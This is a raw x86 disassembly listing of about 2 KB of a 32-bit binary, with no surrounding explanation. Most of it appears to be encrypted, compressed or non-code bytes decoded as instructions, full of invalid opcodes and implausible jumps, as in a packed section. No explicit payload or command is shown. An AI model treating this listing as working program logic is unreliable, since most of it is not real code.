  4091be:	adc    BYTE PTR [edi-0x97c51f0],0x2a
  4091c5:	iret   
  4091c6:	add    ebx,eax
  4091c8:	(bad)  [edi-0x4c]
  4091cb:	lea    ebx,[ebx+esi*8]
  4091ce:	fwait
  4091cf:	add    dl,BYTE PTR [eax+0x74]
  4091d2:	pop    ebx
  4091d3:	cmc    
  4091d4:	cdq    
  4091d5:	fcmove st,st(1)
  4091d7:	lock xchg edx,eax
  4091d9:	jle    0x40915b
  4091db:	xchg   ebp,eax
  4091dc:	call   DWORD PTR [esi+0x62]
  4091df:	scas   eax,DWORD PTR es:[edi]
  4091e0:	dec    ebx
  4091e1:	jmp    0x40923d
  4091e3:	fcom   DWORD PTR [edi+0x3f]
  4091e6:	sbb    eax,0x4c6067dd
  4091eb:	sbb    dl,ch
  4091ed:	outs   dx,DWORD PTR ds:[esi]
  4091ee:	pushf  
  4091ef:	cmp    esp,0xd0310eae
  4091f5:	iret   
  4091f6:	daa    
  4091f7:	int    0x58
  4091f9:	dec    edx
  4091fa:	adc    ch,BYTE PTR [edi+0x1e18343]
  409200:	int3   
  409201:	ins    BYTE PTR es:[edi],dx
  409202:	mov    ch,0xc0
  409204:	push   ebx
  409205:	cmc    
  409206:	ret    
  409207:	lods   eax,DWORD PTR gs:[esi]
  409209:	fcomi  st,st(3)
  40920b:	and    DWORD PTR [esp+edx*1],0xeaf609ef
  409212:	enter  0x7358,0xfe
  409216:	test   eax,0x8ce8cc4d
  40921b:	inc    esp
  40921c:	mov    edx,0xaff4d429
  409221:	(bad)  
  409222:	jno    0x4091da
  409224:	shl    BYTE PTR [edx],1
  409226:	lds    esi,FWORD PTR [edx+0x59]
  409229:	mov    al,0xb1
  40922b:	push   cs
  40922c:	xchg   DWORD PTR [eax-0x28],edi
  40922f:	aad    0xd
  409231:	jo     0x68ee7077
  409237:	(bad)  
  409238:	xor    eax,0xd8e44a57
  40923d:	call   0xf6fbe91b
  409242:	fdiv   DWORD PTR [edx-0x23d4dd9f]
  409248:	adc    bh,0xc5
  40924b:	xchg   esi,eax
  40924c:	jno    0x409291
  40924e:	mov    esi,0x855b7222
  409253:	ficom  WORD PTR [esi-0x1a]
  409256:	mov    ds:0x478bb77f,al
  40925b:	test   eax,0xade0484
  409260:	jno    0x40921a
  409262:	xchg   BYTE PTR [edx],ch
  409264:	xchg   edx,eax
  409265:	icebp  
  409266:	ins    BYTE PTR es:[edi],dx
  409267:	pop    ss
  409268:	mov    cl,0x2d
  40926a:	push   0xffffff90
  40926c:	xor    eax,0xb95652ce
  409271:	test   eax,0xf3ce322
  409276:	xor    esi,esp
  409278:	jns    0x409299
  40927a:	int    0xfb
  40927c:	mov    ecx,0xafea53cb
  409281:	enter  0x4bf9,0x3d
  409285:	lock and eax,0x757f227b
  40928b:	push   edx
  40928c:	stos   DWORD PTR es:[edi],eax
  40928d:	push   ss
  40928e:	mov    ch,0xa4
  409290:	rcr    DWORD PTR [ecx+0x46bdac24],cl
  409296:	mov    ah,0x44
  409298:	jae    0x40925a
  40929a:	int    0x78
  40929c:	mov    DWORD PTR [edi+0x6b623404],esp
  4092a2:	sbb    eax,0x7798ae00
  4092a7:	cld    
  4092a8:	sbb    al,ah
  4092aa:	push   edi
  4092ab:	or     esi,ebp
  4092ad:	mov    esi,0x144eec4f
  4092b2:	mov    BYTE PTR [eax],ch
  4092b4:	rcl    BYTE PTR [edi-0x25],1
  4092b7:	sub    ch,BYTE PTR [esi-0x79861885]
  4092bd:	mov    edx,0xa7b91a54
  4092c2:	sbb    dl,bh
  4092c4:	xor    BYTE PTR [esi+0x1],dh
  4092c7:	in     eax,dx
  4092c8:	and    dl,bl
  4092ca:	mov    ebp,0x4e687930
  4092cf:	mov    ch,0xbe
  4092d1:	cdq    
  4092d2:	fdivr  DWORD PTR [ebp-0x10e53e9b]
  4092d8:	mov    dh,BYTE PTR [eax+0x1a046ae7]
  4092de:	xor    ebx,edi
  4092e0:	push   ebx
  4092e1:	fmul   DWORD PTR [ecx]
  4092e3:	addr16 mov ecx,0xaf678e10
  4092e9:	aam    0x9a
  4092eb:	lea    esp,[eax+0x2c]
  4092ee:	add    al,0xc5
  4092f0:	pop    edx
  4092f1:	retf   
  4092f2:	push   ecx
  4092f3:	aas    
  4092f4:	pop    eax
  4092f5:	push   esp
  4092f6:	add    cl,al
  4092f8:	hlt    
  4092f9:	pop    ebx
  4092fa:	push   esi
  4092fb:	push   eax
  4092fc:	xchg   edi,eax
  4092fd:	stc    
  4092fe:	pop    DWORD PTR ds:0x8d30fff4
  409304:	add    eax,0x41b260
  409309:	push   DWORD PTR [eax]
  40930b:	lea    eax,ds:0x41b344
  409311:	push   DWORD PTR [eax]
  409313:	xchg   ebx,edx
  409315:	inc    ebx
  409316:	inc    ebx
  409317:	sub    ebx,0x3
  40931a:	push   ebx
  40931b:	pop    eax
  40931c:	jmp    0x409669
  409321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409322:	jnp    0x409329
  409324:	or     DWORD PTR [ecx+0x52b3b211],esp
  40932a:	lahf   
  40932b:	jo     0x4092ae
  40932d:	jnp    0x409340
  40932f:	push   ds
  409330:	pop    ds
  409331:	daa    
  409332:	loop   0x4093a4
  409334:	jo     0x409356
  409336:	jge    0x4093a8
  409338:	jo     0x40930b
  40933a:	fwait
  40933b:	jne    0x4092d0
  40933d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40933e:	pop    ebx
  40933f:	push   ss
  409340:	push   cs
  409341:	loop   0x409392
  409343:	in     eax,dx
  409344:	jg     0x4092e8
  409346:	mov    esi,0x822443c0
  40934b:	ror    DWORD PTR [esi+edx*2+0x69222d03],cl
  409352:	add    DWORD PTR [edi-0x6e],0x56
  409356:	lock mov bl,0x80
  409359:	mov    eax,ds:0x13323d26
  40935e:	loopne 0x409391
  409360:	add    cl,BYTE PTR [esi-0x1d71f564]
  409366:	mul    DWORD PTR [esp+edi*1+0x4a1605cb]
  40936d:	mov    esi,0x90be523a
  409372:	retf   0xbf09
  409375:	add    BYTE PTR [eax],dl
  409377:	mov    esp,0x21304515
  40937c:	rol    BYTE PTR [ebp-0x5fdf418a],0xbe
  409383:	sbb    eax,ebp
  409385:	mov    eax,ds:0xa47e8aac
  40938a:	sbb    DWORD PTR [esi],edx
  40938c:	(bad)  
  40938d:	stos   DWORD PTR es:[edi],eax
  40938e:	repnz xlat BYTE PTR ds:[ebx]
  409390:	fist   WORD PTR [ebx-0x43a7b024]
  409396:	scas   eax,DWORD PTR es:[edi]
  409397:	xchg   ebx,eax
  409398:	xchg   ecx,eax
  409399:	(bad)  
  40939a:	mov    esp,0x480b6fc6
  40939f:	sbb    edi,DWORD PTR [edx+0x43750961]
  4093a5:	jae    0x40937d
  4093a7:	push   esp
  4093a8:	(bad)  
  4093a9:	scas   eax,DWORD PTR es:[edi]
  4093aa:	xor    eax,0x156c01c
  4093af:	icebp  
  4093b0:	push   esp
  4093b1:	adc    al,0xb6
  4093b3:	stos   DWORD PTR es:[edi],eax
  4093b4:	push   eax
  4093b5:	jp     0x4093f8
  4093b7:	ins    DWORD PTR es:[edi],dx
  4093b8:	int3   
  4093b9:	sbb    eax,edi
  4093bb:	sbb    DWORD PTR [ebp+0x203d93db],ebp
  4093c1:	in     eax,dx
  4093c2:	aam    0xd2
  4093c4:	sub    DWORD PTR [eax],eax
  4093c6:	das    
  4093c7:	les    ecx,FWORD PTR [eax-0x76f83aa7]
  4093cd:	scas   al,BYTE PTR es:[edi]
  4093ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093cf:	test   al,0x76
  4093d1:	xchg   edi,eax
  4093d2:	pop    ebx
  4093d3:	inc    edx
  4093d4:	xor    eax,ebx
  4093d6:	or     esi,DWORD PTR [ebx]
  4093d8:	sub    al,0x74
  4093da:	cmp    DWORD PTR [edx-0x49],edi
  4093dd:	xor    BYTE PTR [edi-0x55],0xf5
  4093e1:	cli    
  4093e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093e3:	mov    ebx,0xfd961313
  4093e8:	enter  0xde47,0xcc
  4093ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093ed:	inc    edx
  4093ee:	push   0xcecf0b59
  4093f3:	jmp    0x9750:0xbf693abd
  4093fa:	ins    BYTE PTR es:[edi],dx
  4093fb:	in     eax,dx
  4093fc:	rol    DWORD PTR [esi+eiz*1+0x66],cl
  409400:	aaa    
  409401:	xchg   DWORD PTR [ecx-0x4d48a31d],esp
  409407:	mov    edx,0xd86bd77f
  40940c:	outs   dx,BYTE PTR ds:[esi]
  40940d:	xchg   edi,eax
  40940e:	(bad)  
  40940f:	lock xor dl,dl
  409412:	or     ah,bh
  409414:	test   al,0xb7
  409416:	mov    bl,0xb3
  409418:	jnp    0x409484
  40941a:	inc    edx
  40941b:	mov    bl,0x3e
  40941d:	std    
  40941e:	test   BYTE PTR [esi-0x25],bl
  409421:	jle    0x4093d9
  409423:	jnp    0x4093b2
  409425:	hlt    
  409426:	mov    dl,0x78
  409428:	jmp    0x8a90980f
  40942d:	rcl    DWORD PTR [ebx+0x4d2941a],cl
  409433:	sar    BYTE PTR ds:0x862f8307,0x7
  40943a:	(bad)  
  40943b:	out    dx,al
  40943c:	push   ecx
  40943d:	mov    cl,0x30
  40943f:	adc    edx,0x56
  409442:	int    0x7
  409444:	dec    ecx
  409445:	loop   0x40945f
  409447:	int    0xc2
  409449:	adc    DWORD PTR ds:0x9dbdad82,eax
  40944f:	das    
  409450:	xor    al,0x23
  409452:	popa   
  409453:	pop    esi
  409454:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  409456:	xchg   ebx,eax
  409457:	jg     0x409462
  409459:	dec    esi
  40945a:	pop    ebp
  40945b:	rsm    
  40945d:	mov    ds:0xd5a6aab8,al
  409462:	lds    esi,FWORD PTR [ebx]
  409464:	adc    eax,0xfbe3e7ab
  409469:	add    bh,ah
  40946b:	scas   eax,DWORD PTR es:[edi]
  40946c:	enter  0x9c3e,0x75
  409470:	sbb    BYTE PTR [ebp-0x48cdacdb],cl
  409476:	(bad)  
  409477:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409478:	and    BYTE PTR [ecx-0x557c2887],al
  40947e:	lods   eax,DWORD PTR ds:[esi]
  40947f:	shr    esp,cl
  409481:	mov    dh,0x76
  409483:	mov    bl,0x91
  409485:	test   eax,0xd75f8634
  40948a:	bound  esp,QWORD PTR [ecx]
  40948c:	jbe    0x4094ad
  40948e:	jle    0x40944d
  409490:	cli    
  409491:	in     eax,dx
  409492:	mov    ebp,0x8cf3c9f3
  409497:	mov    DWORD PTR [ecx-0x21],esi
  40949a:	mov    esi,0xb9d87c53
  40949f:	push   ebx
  4094a0:	lock push cs
  4094a2:	shr    BYTE PTR [esi+0x4e],cl
  4094a5:	sbb    al,0x7f
  4094a7:	mov    dx,sp
  4094aa:	sbb    ecx,ebx
  4094ac:	aaa    
  4094ad:	push   esi
  4094ae:	gs push edx
  4094b0:	sbb    BYTE PTR [ebp-0x15fbfd1f],0xc3
  4094b7:	mov    ds:0xadc3d5b7,eax
  4094bd:	(bad)  
  4094bf:	push   ebx
  4094c0:	sub    eax,0x4b211458
  4094c5:	jbe    0x4094d0
  4094c7:	sub    al,0x96
  4094c9:	pop    ecx
  4094ca:	jb     0x409512
  4094cc:	push   esp
  4094cd:	je     0x4094e4
  4094cf:	add    eax,0x3371a746
  4094d4:	imul   ebx,DWORD PTR [ebp-0x28],0x181b7a2f
  4094db:	push   es
  4094dc:	or     ah,BYTE PTR [eax]
  4094de:	pop    edx
  4094df:	stos   BYTE PTR es:[edi],al
  4094e0:	icebp  
  4094e1:	mov    ds:0x8f8c0310,al
  4094e6:	xchg   esp,eax
  4094e7:	jg     0x40949a
  4094e9:	mov    edx,0x3deb6cb0
  4094ee:	in     eax,dx
  4094ef:	lea    edi,[eax]
  4094f1:	test   eax,0xca69f12d
  4094f6:	or     al,BYTE PTR [ebp-0x12]
  4094f9:	xor    DWORD PTR [edx+ebx*1-0x5d],esp
  4094fd:	jo     0x4094dd
  4094ff:	mov    al,cs:0x951bde83
  409505:	pop    ss
  409506:	call   0x68badaa0
  40950b:	fstp   DWORD PTR [edx+edi*4+0x30e175a0]
  409512:	es sahf 
  409514:	shr    eax,1
  409516:	or     esi,DWORD PTR [edi-0x2b748644]
  40951c:	and    eax,0x24089b58
  409521:	fld    DWORD PTR [edi-0x25]
  409524:	mov    edx,0xbefe55a6
  409529:	test   DWORD PTR [ecx],edx
  40952b:	stos   BYTE PTR es:[edi],al
  40952c:	stos   BYTE PTR es:[edi],al
  40952d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40952e:	mov    edx,0xd9183752
  409533:	sbb    edi,DWORD PTR [eax+0x6a]
  409536:	push   es
  409537:	inc    eax
  409538:	push   eax
  409539:	mov    ch,0x61
  40953b:	call   0x35146486
  409540:	cmc    
  409541:	mov    esp,0x5047e520
  409546:	jnp    0x409584
  409548:	mov    esp,0xbefa8dee
  40954d:	xor    edi,DWORD PTR [ebx+0x58]
  409550:	mov    WORD PTR [ebp+esi*8-0x56],gs
  409554:	xchg   BYTE PTR [esi-0x17],ah
  409557:	(bad)  
  409559:	sbb    edx,DWORD PTR [ecx+ecx*4]
  40955c:	int    0x3a
  40955e:	sbb    ecx,esi
  409560:	sbb    dh,bl
  409562:	push   0xffffffd6
  409564:	push   ebx
  409565:	frstor [edi-0x36c5caa1]
  40956b:	jne    0x40955b
  40956d:	and    DWORD PTR [ebx],ebx
  40956f:	dec    ebp
  409570:	ror    DWORD PTR [eax+0x61],cl
  409573:	adc    al,0x9a
  409575:	pop    ds
  409576:	(bad)  
  409577:	int3   
  409578:	xor    esi,DWORD PTR [ebx-0x184dfa12]
  40957e:	xor    bh,BYTE PTR [ecx+edi*2]
  409581:	sub    al,0x92
  409583:	ja     0x4095f2
  409585:	std    
  409586:	mov    eax,0xe9a80540
  40958b:	cmp    DWORD PTR ds:0xd81cdfc,eax
  409591:	xchg   DWORD PTR [edx+0x20],edi
  409594:	mov    eax,0x5508a2ca
  409599:	adc    al,0xd4
  40959b:	addr16 pushf 
  40959d:	not    DWORD PTR [ebx+eax*8-0x12be4670]
  4095a4:	sbb    eax,0x5dfed0d7
  4095a9:	xchg   ebx,eax
  4095aa:	push   esi
  4095ab:	sbb    al,0xbd
  4095ad:	and    BYTE PTR [esi],ch
  4095af:	aaa    
  4095b0:	adc    eax,0x9de6b8de
  4095b5:	or     edi,DWORD PTR [edx-0x546c5228]
  4095bb:	retf   
  4095bc:	in     al,0xd9
  4095be:	xchg   edi,eax
  4095bf:	and    al,ah
  4095c1:	push   0xa0648c60
  4095c6:	mov    ah,0x14
  4095c8:	or     cl,0x59
  4095cb:	out    0x6c,eax
  4095cd:	mov    ecx,0xc3304d50
  4095d2:	test   al,0x5a
  4095d4:	push   ebp
  4095d5:	xchg   edi,eax
  4095d6:	in     eax,0xc7
  4095d8:	cmp    edx,DWORD PTR [eax]
  4095da:	add    eax,0xd90d2cf6
  4095df:	xor    eax,0x8327409f
  4095e4:	(bad)  
  4095e5:	dec    edx
  4095e6:	jle    0x4095e9
  4095e8:	int3   
  4095e9:	lods   eax,DWORD PTR ds:[esi]
  4095ea:	icebp  
  4095eb:	mov    es,WORD PTR cs:[eax+eax*8+0x33]
  4095f0:	xor    eax,0xaa5af1f3
  4095f5:	and    al,0x60
  4095f7:	cmp    BYTE PTR [eax-0x53],ch
  4095fa:	test   BYTE PTR [edi+eiz*8-0x6185af8],0x10
  409602:	out    0x63,al
  409604:	inc    edi
  409605:	inc    ecx
  409606:	sti    
  409607:	out    dx,eax
  409608:	in     eax,0xf1
  40960a:	add    esp,DWORD PTR [ebp+0x331f4237]
  409610:	jno    0x409646
  409612:	jle    0x4095c5
  409614:	or     al,0x2
  409616:	jae    0x409629
  409618:	lds    edx,FWORD PTR [edx+0x58]
  40961b:	dec    esi
  40961c:	fdivr  QWORD PTR [esi]
  40961e:	push   edi
  40961f:	cmp    BYTE PTR [edi-0x52],0xc6
  409623:	xor    al,0xd0
  409625:	mov    dh,0x47
  409627:	rol    BYTE PTR [edx-0x14],1
  40962a:	in     al,dx
  40962b:	cmp    dh,BYTE PTR [ebx+0x12]
  40962e:	dec    ecx
  40962f:	sub    ebp,DWORD PTR [ecx+0x3a]
  409632:	or     bh,BYTE PTR [ebp-0x130b514c]
  409638:	mov    eax,0xe1f9c7c
  40963d:	push   0xa43c7afb
  409642:	jnp    0x4096ad
  409644:	out    dx,al
  409645:	test   bh,bl
  409647:	pusha  
  409648:	fmul   DWORD PTR [bp+si-0x61c5]
  40964d:	cmp    bh,bh
  40964f:	das    
  409650:	push   0xfffffffb
  409652:	int    0x3f
  409654:	fidivr DWORD PTR [ecx-0x42a3808]
  40965a:	and    ah,dh
  40965c:	fmul   DWORD PTR [eax]
  40965e:	mov    esp,0xdca04bde
  409663:	jne    0x409691
  409665:	loope  0x40969b
  409667:	push   eax
  409668:	sar    bh,0x50
  40966b:	add    DWORD PTR [ebx+0xd8be045],ecx
  409671:	and    al,0xb2
  409673:	inc    ecx
  409674:	add    cl,ch
  409676:	dec    eax
  409677:	add    eax,DWORD PTR [eax]
  409679:	add    bh,ch
  40967b:	mov    ebx,0xd169d149
  409680:	ja     0x4096e3
  409682:	add    BYTE PTR [edi+0x44],bh
  409685:	xchg   DWORD PTR [eax],eax
  409687:	lods   al,BYTE PTR ds:[esi]
  409688:	inc    esp
  409689:	xchg   bh,dl
  40968b:	out    dx,eax
  40968c:	jo     0x4096fe
  40968e:	and    BYTE PTR [ebp+0x70],bh
  409691:	jo     0x409616
  409693:	into   
  409694:	inc    edx
  409695:	sbb    edi,DWORD PTR [esp+eax*8+0x4e]
  409699:	scas   eax,DWORD PTR es:[edi]
  40969a:	retf   
  40969b:	add    al,0x3a
  40969d:	out    0x60,eax
  40969f:	mov    WORD PTR [ecx-0x20],es
  4096a2:	and    edi,DWORD PTR [esi]
  4096a4:	sub    BYTE PTR [edx],dl
  4096a6:	and    BYTE PTR [esp+edx*8+0x21d512d],dh
  4096ad:	bound  edi,QWORD PTR [ebx]
  4096af:	mov    cl,0x8d
  4096b1:	out    0x7d,al
  4096b3:	test   edx,esi
  4096b5:	setae  BYTE PTR [edi-0x62]
  4096b9:	mov    ah,0x71
  4096bb:	sbb    eax,DWORD PTR ds:0x72a65c15
  4096c1:	nop
  4096c2:	call   0xf7f7:0x4e8194e
  4096c9:	jge    0x4096ac
  4096cb:	inc    esi
  4096cc:	repnz inc ebx
  4096ce:	ds (bad) 
  4096d0:	sar    BYTE PTR [eax-0x54],0x11
  4096d4:	lahf   
  4096d5:	jmp    0xcebb:0x91649999
  4096dc:	aad    0xc1
  4096de:	(bad)  
  4096e0:	mov    DWORD PTR [edi+edi*8-0x7360d6c6],edx
  4096e7:	or     ah,BYTE PTR [edx+eax*2]
  4096ea:	sbb    eax,ebp
  4096ec:	mov    ds:0xddc15a24,eax
  4096f1:	xor    ebx,ebx
  4096f3:	fldenv [ecx+0x4d]
  4096f6:	push   esi
  4096f7:	test   DWORD PTR [ebp+0x6c60b643],edx
  4096fd:	sub    al,0xb
  4096ff:	sub    DWORD PTR [eax],esp
  409701:	jbe    0x40973f
  409703:	sahf   
  409704:	dec    esp
  409705:	mov    esi,0x9e89bf86
  40970a:	push   0xffffff8c
  40970c:	xor    ebx,DWORD PTR [ebx+0x7aabc67b]
  409712:	enter  0x502f,0xca
  409716:	cwde   
  409717:	fnsave [eax-0x2fdfefd5]
  40971d:	sbb    DWORD PTR [edi],ebx
  40971f:	pop    ecx
  409720:	pop    ebp
  409721:	mov    fs,WORD PTR [eax-0x31cee8aa]
  409727:	mov    bl,0x43
  409729:	cmp    esp,DWORD PTR ds:0xb743e83f
  40972f:	retf   
  409730:	das    
  409731:	inc    ebp
  409732:	pop    es
  409733:	ss mov bl,0xcd
  409736:	mov    es,WORD PTR [ecx-0x499fc171]
  40973c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40973d:	sub    DWORD PTR [edx-0xc4cfad1],esp
  409743:	loopne 0x409787
  409745:	out    0x59,eax
  409747:	dec    eax
  409748:	out    0xa8,al
  40974a:	and    ebp,DWORD PTR [esi]
  40974c:	pop    ebp
  40974d:	xlat   BYTE PTR ds:[ebx]
  40974e:	mov    edx,0xc8b57b98
  409753:	into   
  409754:	adc    al,0x6b
  409756:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409757:	xchg   DWORD PTR [ecx-0x483ddcc],esp
  40975d:	div    al
  40975f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409760:	cmp    bh,BYTE PTR [esi-0x71]
  409763:	fwait
  409764:	jle    0x409785
  409766:	cmp    al,0x89
  409768:	xor    eax,ebp
  40976a:	in     al,0x6b
  40976c:	add    al,0x16
  40976e:	sti    
  40976f:	dec    edi
  409770:	into   
  409771:	jg     0x4097d9
  409773:	jl     0x40978f
  409775:	add    dh,ch
  409777:	jnp    0x409796
  409779:	cmp    dl,BYTE PTR [edx+0x16]
  40977c:	bound  esi,QWORD PTR [ecx+0x57880de8]
  409782:	mov    ebp,0x12becaa2
  409787:	jns    0x409808
  409789:	push   DWORD PTR [ecx+eax*2+0x67]
  40978d:	mov    ah,0xb1
  40978f:	xchg   esi,eax
  409790:	push   0xf9fdf2cb
  409795:	push   esp
  409796:	ficom  DWORD PTR [ecx-0x37892c86]
  40979c:	sbb    dh,cl
  40979e:	fild   DWORD PTR [edi-0x1428c014]
  4097a4:	or     cl,bl
  4097a6:	stc    
  4097a7:	and    al,0x4e
  4097a9:	and    eax,DWORD PTR [esi+0x4b44b504]
  4097af:	out    dx,eax
  4097b0:	(bad)  
  4097b1:	mov    bl,0xfe
  4097b3:	add    al,0xd5
  4097b5:	mov    dh,0xa8
  4097b7:	rcr    DWORD PTR [esi+ecx*2-0x66],cl
  4097bb:	xchg   esp,eax
  4097bc:	sub    eax,0x22f0b473
  4097c1:	xchg   esp,eax
  4097c2:	jmp    0x61f8661f
  4097c7:	lahf   
  4097c8:	xor    eax,0x1e21a93e
  4097cd:	test   eax,0x4d6641e4
  4097d2:	in     eax,0x1f
  4097d4:	enter  0xe326,0xfa
  4097d8:	sbb    al,BYTE PTR [ecx]
  4097da:	push   ebp
  4097db:	fcmovb st,st(0)
  4097dd:	fiadd  WORD PTR [ecx]
  4097df:	lahf   
  4097e0:	daa    
  4097e1:	pop    ds
  4097e2:	adc    DWORD PTR [eax],ebx
  4097e4:	xor    DWORD PTR [ecx+0x4d3ad868],ebx
  4097ea:	aam    0x49
  4097ec:	pop    eax
  4097ed:	fcom   DWORD PTR [edi+0x21862582]
  4097f3:	xchg   BYTE PTR ds:0x4c9c71b9,ch
  4097f9:	mov    al,ds:0xb0bd23c0
  4097fe:	jns    0x4097f2
  409800:	add    eax,0xe9537891
  409805:	fsubr  st,st(7)
  409807:	dec    edi
  409808:	xor    BYTE PTR [edx-0x720301d2],dh
  40980e:	lods   al,BYTE PTR ds:[esi]
  40980f:	in     al,0xd5
  409811:	out    dx,al
  409812:	push   edx
  409813:	adc    esi,edi
  409815:	mov    eax,0xfe4d1ebc
  40981a:	xchg   edi,eax
  40981b:	ds ret 0x91ca
  40981f:	cs aad 0xb6
  409822:	mov    cs,esp
  409824:	xlat   BYTE PTR ds:[ebx]
  409825:	mul    DWORD PTR [eax-0x677ab182]
  40982b:	adc    DWORD PTR [ebx],ecx
  40982d:	loope  0x409814
  40982f:	xchg   edi,eax
  409830:	(bad)  
  409831:	or     al,0xb3
  409833:	arpl   WORD PTR [edi],dx
  409835:	stos   DWORD PTR es:[edi],eax
  409836:	cmp    al,0x5f
  409838:	std    
  409839:	add    eax,0x41616b23
  40983e:	mov    ah,0x76
  409840:	aad    0x36
  409842:	jp     0x409829
  409844:	sbb    bl,BYTE PTR [ebp+0x4b]
  409847:	pop    ss
  409848:	out    0x64,al
  40984a:	push   esp
  40984b:	add    BYTE PTR ds:0x85dded2a,dh
  409851:	(bad)  [ecx+0xd6e2dfd]
  409857:	mov    dh,0xb4
  409859:	sub    eax,DWORD PTR [ecx-0x1d3f01b4]
  40985f:	(bad)  
  409860:	pop    eax
  409861:	pop    edx
  409862:	push   ecx
  409863:	ret    0x3552
  409866:	xlat   BYTE PTR ds:[ebx]
  409867:	call   0x7e09a68c
  40986c:	dec    esp
  40986d:	inc    edx
  40986e:	mov    dh,0x1
  409870:	cmc    
  409871:	lock mov DWORD PTR [edx-0x505f5327],ecx
  409878:	fstp   DWORD PTR [ecx+0x916d8d]
  40987f:	or     ch,BYTE PTR [esi+0x6172014f]
  409885:	aaa    
  409886:	sahf   
  409887:	push   0x205bf9ca
  40988c:	out    dx,eax
  40988d:	sar    DWORD PTR [ecx+eax*2+0x58],cl
  409891:	mov    ch,0x1e
  409893:	inc    ebx
  409894:	xor    BYTE PTR [esi],cl
  409896:	iret   
  409897:	repnz mov fs,edx
  40989a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40989b:	pop    ebp
  40989c:	test   eax,0xefa595e8
  4098a1:	push   ebp
  4098a2:	aas    
  4098a3:	test   DWORD PTR [edx+0x4f],edx
  4098a6:	or     esi,esp
  4098a8:	cmp    esp,DWORD PTR [ebp+0x47a4752b]
  4098ae:	(bad)  
  4098af:	mov    esi,0x51b42da0
  4098b4:	test   ch,bl
  4098b6:	lods   eax,DWORD PTR ds:[esi]
  4098b7:	jl     0x409938
  4098b9:	std    
  4098ba:	(bad)  
  4098bb:	bound  esi,QWORD PTR [esi+0x72]
  4098be:	daa    
  4098bf:	(bad)  [ecx+0x4d39375c]
  4098c5:	enter  0x361b,0x8e
  4098c9:	push   ebp
  4098ca:	mov    ebp,0x87f9b8e4
  4098cf:	imul   esp,DWORD PTR [ebx-0x6b],0x60221896
  4098d6:	loope  0x40991d
  4098d8:	add    eax,0xea7ff737
  4098dd:	inc    ebp
  4098de:	popf   
  4098df:	iret   
  4098e0:	loop   0x4098d9
  4098e2:	mov    bh,0x4e
  4098e4:	ficom  DWORD PTR [esi]
  4098e6:	stos   DWORD PTR es:[edi],eax
  4098e7:	and    ebp,DWORD PTR [edx+0x43]
  4098ea:	dec    ebx
  4098eb:	(bad)  
  4098ec:	(bad)  
  4098ee:	push   0x11
  4098f0:	out    dx,al
  4098f1:	dec    edi
  4098f2:	cld    
  4098f3:	push   esp
  4098f4:	addr16 loope 0x4098d9
  4098f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098f8:	and    edi,DWORD PTR [ecx+ebx*8+0x4a]
  4098fc:	cld    
  4098fd:	jecxz  0x40996b
  4098ff:	aam    0x9e
  409901:	addr16 inc esi
  409903:	add    eax,0xaa9113e2
  409908:	or     esi,edi
  40990a:	or     esi,DWORD PTR [edx+0x3c]
  40990d:	dec    ebp
  40990e:	xor    ah,BYTE PTR [ebx-0x4a]
  409911:	jl     0x409958
  409913:	dec    ebp
  409914:	mov    edx,0xbecf301e
  409919:	pop    es
  40991a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40991b:	data16 ja 0x40993e
  40991e:	les    esp,FWORD PTR [ebx-0x2821e144]
  409924:	xor    al,0xc4
  409926:	xchg   esp,eax
  409927:	mov    al,0x84
  409929:	pop    esp
  40992a:	pop    edx
  40992b:	mov    ecx,0x52c698fb
  409930:	or     ch,al
  409932:	imul   BYTE PTR [edi+0x5356264a]
  409938:	scas   al,BYTE PTR es:[edi]
  409939:	inc    edx
  40993a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40993b:	xchg   DWORD PTR [edx],edi
  40993d:	aas    
  40993e:	dec    edi
  40993f:	mov    ebp,0x63c24dd2
  409944:	cmp    eax,0xb8138fd6
  409949:	lea    edi,[ebp+0x79c7cbd]
  40994f:	push   ecx
  409950:	sbb    eax,0x6262e7aa
  409955:	leave  
  409956:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409957:	cwde   
  409958:	pushf  
  409959:	icebp  
  40995a:	cmc    
  40995b:	aam    0xba
  40995d:	inc    eax
  40995e:	mov    eax,ds:0xb2ed9a7d
  409963:	cdq    
  409964:	ss lahf 
  409966:	inc    ebx
  409967:	fs sti 
  409969:	in     al,0xcb
  40996b:	jnp    0x409963
  40996d:	sahf   
  40996e:	fstp   TBYTE PTR [ebx+0x2d]
  409971:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409972:	mov    ecx,0xc553226a
  409977:	mov    cl,0x4d
  409979:	retf   0x6309
  40997c:	mov    bh,0xa6
  40997e:	adc    BYTE PTR [eax],al
  409980:	jp     0x409994
  409982:	xor    dl,bl
  409984:	js     0x409a05
  409986:	aaa    
  409987:	xor    ebp,DWORD PTR ds:0xed632bf4
  40998d:	retf   0x7293
  409990:	and    al,0x70
  409992:	jno    0x409988
  409994:	cmp    eax,DWORD PTR [esi-0x10ef0b37]
  40999a:	or     al,0xf5
  40999d:	lock mov ds:0xaf6a0ed9,eax
  4099a3:	daa    
  4099a4:	sar    DWORD PTR [ecx-0x4db3f1db],cl
  4099aa:	add    BYTE PTR [edx+ebp*2],bh
  4099ad:	push   eax
  4099ae:	(bad)  
  4099b0:	popf   
  4099b1:	push   edx
  4099b2:	es call 0xcac4d164
  4099b8:	jmp    FWORD PTR [esi+0x7e8103a5]
  4099be:	sbb    eax,0x14e51fd
  4099c3:	or     BYTE PTR [edi+0x5e],bl
  4099c6:	pop    ebx
  4099c7:	leave  
  4099c8:	ret    
  4099c9:	push   ebp
  4099ca:	mov    ebp,esp
  4099cc:	sub    esp,0x44
  4099cf:	push   edi
  4099d0:	sub    DWORD PTR ds:0x42fd8a,0x50c
